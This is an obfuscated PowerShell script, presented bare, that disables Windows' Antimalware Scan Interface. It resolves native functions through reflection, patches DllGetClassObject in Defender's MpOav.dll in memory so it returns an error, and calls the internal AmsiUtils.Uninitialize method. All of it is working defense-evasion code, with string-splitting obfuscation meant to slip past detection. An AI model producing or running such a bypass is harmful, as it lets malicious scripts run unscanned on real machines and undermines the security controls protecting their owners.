 SET-vARiaBLE  ("{1}{0}"-f'w','4I58') (  [TYpe]("{0}{1}{2}" -F 'A','PPDOMa','In')  );set  ('J2'+'8Pa') ([TypE]("{10}{11}{1}{8}{5}{3}{4}{6}{7}{2}{0}{9}"-f'E','t','blYBUIldEracC','ctiON.E','Mit','Le','.AsS','Em','EM.REF','ss','sY','S')  );    set-itEM ("V"+"ARiAbL"+"e:g"+"0b"+"KV")  ([tyPe]("{7}{4}{1}{6}{9}{5}{2}{0}{8}{3}"-f 'Lin','TE','aL','NVenTIons','YS','ON.c','m.REflE','S','Gco','CtI')  ) ;   SeT-ITeM  ("{2}{3}{0}{1}"-f'ri','ABLE:fTN','v','a') ([TyPe]("{2}{0}{1}"-F'Int','32','u')  ) ;${H7`ly}  = [TYPe]("{8}{3}{5}{7}{1}{6}{2}{0}{4}{9}" -f 'es.mARsh','nT','SErviC','yStem.','A','ruN','eROp','TiMe.I','s','L');Set-itEM  ("{1}{3}{2}{0}"-f 'S','VaRiABL','k','E:C9') ([tYpE]("{1}{0}" -f 'Ef','r') )  ;  function gE`T`-ProCad`DResS {
    Param(
        [Parameter(POSItIon = 0, manDatOry = ${TR`Ue})] [String] ${Mo`Du`Le},
        [Parameter(posITiON = 1, MaNDaTOrY = ${T`Rue})] [String] ${PR`oCe`duRE}
    )

    
    ${S`Yst`E`MASsEm`BLY} =   ( VAriABlE ("{1}{0}" -f '8w','4i5')  -va)::"CU`Rr`ENtd`omA`iN".("{0}{1}{2}" -f 'Ge','tAssem','blies').Invoke() |
    &("{1}{2}{3}{0}"-f'ct','Whe','re-Ob','je') { ${_}."G`LObA`laSSe`mBLYCA`CHe" -And ${_}."LO`Cati`oN".("{1}{0}" -f't','Spli').Invoke('\\')[-1].("{1}{0}"-f's','Equal').Invoke(("{1}{0}{2}" -f 'yst','S','em.dll')) }
    ${UN`sAfeNAti`VEMe`THoDs} = ${sy`stemA`sSem`BLY}.("{0}{1}"-f 'Ge','tType').Invoke(("{3}{1}{4}{9}{0}{8}{6}{7}{2}{5}" -f'feNa','ft.Wi','tho','Microso','n32','ds','M','e','tive','.Unsa'))
    
    ${gETMODul`E`hA`NDlE} = ${un`S`AfeNaTi`VEM`eT`HoDS}.("{0}{1}{2}" -f'G','etMeth','od').Invoke(("{3}{1}{0}{2}"-f'tM','e','oduleHandle','G'))
    ${G`eTProC`Ad`dReSS} = ${uNSAF`enATivE`M`ETHoDs}.("{0}{2}{1}"-f 'GetM','hod','et').Invoke(("{0}{1}{2}{3}" -f'GetProcAd','d','r','ess'), [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    
    ${kERn3`2h`AnDLE} = ${Ge`T`Mo`DulEHan`DLe}."In`V`oke"(${Nu`ll}, @(${Modu`lE}))
    ${tm`Pp`Tr} = &("{0}{2}{1}"-f 'Ne','-Object','w') ("{1}{0}" -f 'Ptr','Int')
    ${H`ANDlEr`Ef} = .("{1}{0}{2}"-f 'bjec','New-O','t') ("{0}{8}{1}{2}{4}{6}{3}{7}{9}{5}"-f'Syst','m.Ru','nti','.In','m','ervices.HandleRef','e','tero','e','pS')(${t`mPptR}, ${Ke`Rn`3`2ha`NDle})
    
    return ${gE`TPr`o`CAdd`ResS}."invO`kE"(${Nu`Ll}, @([System.Runtime.InteropServices.HandleRef]${H`An`DlEr`EF}, ${pro`c`EdU`RE}))
}
function gE`T-dEL`egA`TETYPe
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( pOSITIOn = 0)]
        [Type[]]
        ${PAR`AmE`TerS} = (&("{3}{2}{1}{0}" -f'ct','je','-Ob','New') ("{1}{2}{0}" -f '[]','Typ','e')(0)),
            
        [Parameter( POSitIon = 1 )]
        [Type]
        ${re`TU`RNtYpe} = [Void]
    )

    ${D`O`MAiN} =   ${4`I5`8W}::"C`U`RRen`TDO`MAIN"
    ${dY`Nas`sEm`BLy} = &("{1}{0}{2}" -f 'w-','Ne','Object') ("{5}{1}{0}{4}{3}{2}{6}" -f 'em.Reflect','t','ly','ssemb','ion.A','Sys','Name')(("{2}{0}{3}{1}" -f'tedD','legate','Reflec','e'))
    ${a`ssEMBLYBu`ilDER} = ${DOMA`in}.("{3}{4}{2}{0}{5}{1}" -f 'icAs','embly','ynam','D','efineD','s').Invoke(${dyNAsS`eMb`LY},   ( varIAble ('J2'+'8pa')  )."vaL`UE"::"R`Un")
    ${mOdulEb`U`ild`eR} = ${asseMBly`B`UilD`er}.("{2}{3}{1}{0}" -f'odule','icM','De','fineDynam').Invoke(("{1}{3}{2}{0}" -f 'odule','I','M','nMemory'), ${fa`LSe})
    ${TYPe`BuI`l`DEr} = ${mO`D`UlEBUIlder}.("{1}{0}{2}"-f 'fineTy','De','pe').Invoke(("{1}{2}{0}{3}" -f'y','MyDel','egateT','pe'), ("{2}{5}{6}{3}{8}{1}{7}{0}{9}{4}" -f 's','ic, Sealed, AnsiCl','Cla',' ','s','ss',',','as','Publ',', AutoClas'), [System.MulticastDelegate])
    ${cOnSt`RucTor`BUIL`Der} = ${T`ypebUi`lder}.("{0}{3}{2}{1}{4}" -f 'Defi','t','Construc','ne','or').Invoke(("{5}{6}{0}{2}{3}{1}{4}{7}{8}" -f'lNa','d','me, H','i','eB','RTS','pecia','ySig',', Public'),   (gCI ("v"+"ariabl"+"e:g"+"0B"+"Kv") )."v`ALuE"::"st`Anda`RD", ${par`Am`eTe`Rs})
    ${co`Ns`TRUctorBUi`LdeR}.("{1}{4}{2}{3}{0}"-f'onFlags','SetIm','lementa','ti','p').Invoke(("{4}{1}{0}{2}{3}" -f'Man','time, ','ag','ed','Run'))
    ${m`EtHOdB`UI`l`DER} = ${Ty`pEbU`ILD`Er}.("{1}{2}{0}{3}" -f 'eMetho','Def','in','d').Invoke('Invoke', ("{8}{3}{4}{0}{5}{6}{1}{2}{7}{9}"-f'ic, Hide','ig, Ne','wSlot','ub','l','B','yS',', Virt','P','ual'), ${R`EtU`RnT`Ype}, ${PaRAM`e`Te`Rs})
    ${mET`H`odBuI`l`dER}.("{4}{2}{0}{3}{1}"-f't','lags','menta','ionF','SetImple').Invoke(("{4}{1}{0}{3}{2}" -f'time','un','d',', Manage','R'))
        
    .("{0}{2}{1}" -f 'Write-','t','Outpu') ${TY`P`eB`UiLDEr}.("{3}{1}{2}{0}" -f'e','e','Typ','Creat').Invoke()
}
${L`o`AdlibR`AR`y`AdDR} = .("{3}{2}{0}{1}" -f'ocAd','dress','et-Pr','G') ("{2}{0}{1}"-f'ernel32.d','ll','k') ("{2}{0}{1}" -f'oadLibra','ryA','L')
${loadLIB`Ra`RYdE`LeGaTE} = &("{1}{3}{0}{2}" -f'teT','Get','ype','-Delega') @([String]) ([IntPtr])
${l`OAdli`BrA`RY} =   ( geT-VAriablE  ("{0}{1}"-f'h7','Ly') -vALueoN  )::("{2}{1}{5}{7}{0}{3}{6}{4}" -f'te','t','Ge','ForFunctionPoi','er','D','nt','elega').Invoke(${loAD`LIb`R`Ar`y`ADDR},
${LO`ADlIbRAR`YDe`lEgaTe})
${GEtP`R`oca`dD`REssaD`DR} = .("{4}{3}{1}{2}{0}" -f 'dress','o','cAd','Pr','Get-') ("{2}{1}{0}" -f'2.dll','rnel3','ke') ("{2}{3}{0}{1}" -f'rocA','ddress','Get','P')
${geT`Pr`oCAddrEsSdEl`e`GATe} = &("{1}{4}{2}{3}{0}" -f 'e','G','-DelegateT','yp','et') @([IntPtr], [String]) ([IntPtr])
${gEtpRO`CaDDR`Ess} =   (  GeT-VARiabLE ("{0}{1}" -f'H','7LY')  -VA )::("{5}{7}{8}{3}{2}{1}{0}{6}{4}" -f 'nt','Poi','ion','unct','r','Get','e','De','legateForF').Invoke(${GEtpRo`CADD`REss`A`dDR},
${G`EtPro`Cad`Dr`esSDeL`E`g`ATe})
${VIRT`UaL`PrOtEcTA`Ddr} = &("{0}{3}{4}{1}{2}" -f'Get-Proc','s','s','Addr','e') ("{3}{2}{1}{0}" -f 'dll','.','rnel32','ke') ("{0}{1}{3}{2}"-f 'Vir','tual','tect','Pro')
${viRtUAlpr`o`Te`C`TDEleGATE} = &("{4}{1}{0}{3}{2}"-f 'D','-','pe','elegateTy','Get') @([IntPtr], [UIntPtr], [UInt32],   ( ItEm  ("{2}{0}{1}" -f'IaBLe:FT','n','VAr')  )."V`Alue".("{0}{2}{1}"-f'Make','yRefType','B').Invoke()) ([Bool])
${Virt`Ua`LPRo`TeCt} =   ( vARiABlE  ("{1}{0}"-f 'Ly','H7') )."V`ALuE"::("{1}{2}{5}{6}{3}{4}{0}"-f'r','GetD','el','nctionP','ointe','egate','ForFu').Invoke(${VIrt`UaLPr`oTe`C`TadDR},
${viRTu`Alp`Rot`eCT`DELe`GATE})

${HMO`d`UlE} = ${LoA`dlI`BrAry}."i`NVoKE"(("{1}{0}" -f 'dll','MpOav.'))
${d`L`LG`ETclaS`S`objecT`Ad`dREss} = ${Ge`TP`RocaD`dResS}."INVo`Ke"(${hMo`D`ULE},
("{2}{3}{1}{0}" -f'bject','sO','DllGe','tClas'))
${P} = 0
${ViRtU`A`l`PROtE`CT}."IN`Vo`Ke"(${D`LlgetCL`Ass`O`BJ`E`ctADD`RESs}, [uint32]6, 0x40, [ref]${P}) 
${RET_`mi`NuS} = [byte[]] (0xb8, 0xff, 0xff, 0xff, 0xff, 0xC3)
  ( LS  ("{1}{2}{0}"-f 'y','V','aRiaBLe:H7l')  )."VAL`Ue"::("{0}{1}"-f 'Cop','y').Invoke(${RE`T_`min`US}, 0, ${DlLGEtclAssoB`j`E`C`TAd`d`RESs}, 6)
${oBj`e`Ct} =  (GEt-ItEM  ("{0}{3}{1}{2}" -f 'V','ab','le:C9Ks','Ari')  )."V`Alue"."as`s`eMbLY".("{0}{1}{2}"-f'Get','T','ype').Invoke(("{1}{2}{0}"-f'a','Sys','tem.M')+'nag'+'eme'+("{0}{1}"-f 'nt.Au','tom')+("{0}{1}"-f'ati','on.A')+'ms'+'iU'+'ti'+'ls')
${un`I`NITiAli`ze} = ${O`B`JEct}.("{1}{0}{2}" -f'e','GetM','thods').Invoke('N'+("{1}{0}"-f 'Pu','on')+("{2}{1}{0}" -f'c,st','i','bl')+'at'+'ic') | &("{3}{1}{2}{0}" -f'ect','ere-Ob','j','Wh') ("{1}{0}"-f'me','Na') -eq ("{1}{0}{2}" -f'li','Uninitia','ze')
${u`NIni`TialIzE}."IN`Vo`KE"(${O`BJ`ecT},${Nu`Ll}) 

